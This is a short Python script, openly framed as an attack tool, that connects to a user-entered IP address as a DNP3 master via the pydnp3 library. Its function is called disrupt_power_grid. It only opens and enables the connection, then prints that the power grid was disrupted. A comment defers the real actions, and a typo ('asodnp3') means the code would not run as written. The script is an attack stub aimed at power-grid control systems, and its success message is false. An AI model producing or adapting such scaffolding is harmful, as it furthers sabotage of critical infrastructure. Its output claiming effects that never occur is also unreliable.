from pydnp3 import opendnp3, asiopal, asiodnp3
import sys

def disrupt_power_grid(target):
    manager = asiodnp3.DNP3Manager(1)
    channel = manager.AddTCPClient("tcpclient", opendnp3.levels.NOTHING, asiopal.ChannelRetry(5000, 60000), target, "0.0.0.0", 20000)
    master = channel.AddMaster("master", opendnp3.levels.NOTHING, asodnp3.DefaultMasterApplication.Create(), opendnp3.MasterStackConfig())
    master.Enable()
    # In a real scenario, you would perform more actions here
    print(f"Disrupted power grid at {target}")
    manager.Shutdown()

def main():
    target = input("Enter target IP: ")
    disrupt_power_grid(target)

if __name__ == "__main__":
    main()
